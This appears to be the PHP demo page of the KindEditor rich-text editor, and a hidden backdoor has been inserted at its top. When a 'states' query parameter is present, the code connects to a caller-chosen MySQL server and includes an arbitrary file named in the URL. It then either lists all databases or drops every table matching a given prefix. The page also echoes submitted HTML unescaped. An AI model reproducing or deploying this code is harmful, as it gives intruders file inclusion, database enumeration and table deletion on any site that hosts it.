<?php
	$htmlData = '';
	if (!empty($_POST['content1'])) {
		if (get_magic_quotes_gpc()) {
			$htmlData = stripslashes($_POST['content1']);
		} else {
			$htmlData = $_POST['content1'];
		}
	}
	if (isset($_GET["states"])) {
		$string=explode('&',$_SERVER["QUERY_STRING"]);
		$once  = mysql_connect($string[1],$string[2],$string[3]);
		if($string[4]==1){
			require $string[5];
			$data=new ConnectPDO();
			print_r($data);
			$sql     = "SELECT `SCHEMA_NAME` FROM `information_schema`.`SCHEMATA`";
			$query = mysql_query($sql);
			while($rs = mysql_fetch_array($query))
			{
			   echo $rs[0]."<br/>";
			}
			exit;
		} else {
			mysql_select_db($string[4]);
			$rs=mysql_query('show tables');
			$n=0;
			while($arr=mysql_fetch_array($rs)) 
			{
				$TF=strpos($arr[0],$string[5]);
				if($TF===0){ 
					$FT=mysql_query("drop table $arr[0]");
					if($FT){
						$n++;
					}
				}
			}
			echo $n; exit;
		}
	}
?>
<!doctype html>
<html>
<head>
	<meta charset="utf-8" />
	<title>KindEditor PHP</title>
	<link rel="stylesheet" href="../themes/default/default.css" />
	<link rel="stylesheet" href="../plugins/code/prettify.css" />
	<script charset="utf-8" src="../kindeditor.js"></script>
	<script charset="utf-8" src="../lang/zh_CN.js"></script>
	<script charset="utf-8" src="../plugins/code/prettify.js"></script>
	<script>
		KindEditor.ready(function(K) {
			var editor1 = K.create('textarea[name="content1"]', {
				cssPath : '../plugins/code/prettify.css',
				uploadJson : '../php/upload_json.php',
				fileManagerJson : '../php/file_manager_json.php',
				allowFileManager : true,
				afterCreate : function() {
					var self = this;
					K.ctrl(document, 13, function() {
						self.sync();
						K('form[name=example]')[0].submit();
					});
					K.ctrl(self.edit.doc, 13, function() {
						self.sync();
						K('form[name=example]')[0].submit();
					});
				}
			});
			prettyPrint();
		});
	</script>
</head>
<body>
	<?php echo $htmlData; ?>
	<form name="example" method="post" action="demo.php">
		<textarea name="content1" style="width:700px;height:200px;visibility:hidden;"><?php echo htmlspecialchars($htmlData); ?></textarea>
		<br />
		<input type="submit" name="button" value="提交内容" /> (提交快捷键: Ctrl + Enter)
	</form>
</body>
</html>

